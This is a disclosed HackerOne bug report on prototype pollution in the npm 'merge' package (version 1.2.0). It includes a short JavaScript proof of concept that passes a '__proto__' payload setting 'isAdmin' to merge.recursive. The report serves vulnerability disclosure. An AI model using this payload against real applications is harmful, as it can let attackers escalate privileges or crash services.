# Prototype pollution attack (merge.recursive)

## Report Details
- **Report ID**: 381194
- **URL**: https://hackerone.com/reports/381194
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-07-13T10:26:55.413Z
- **Disclosed**: 2018-09-28T10:13:25.154Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report prototype pollution in merge.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** merge
**version:** 1.2.0
**npm page:** `https://www.npmjs.com/package/merge`

## Module Description

Merge multiple objects into one, optionally creating a new cloned object. Similar to the jQuery.extend but more flexible. Works in Node.js and the browser.

## Module Stats

1,822,662 downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `merge.recursive` function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{__proto__: {...}}` and send it to `merge.recursive`.

```javascript
let merge = require('merge');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge.recursive({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Attachments
No attachments
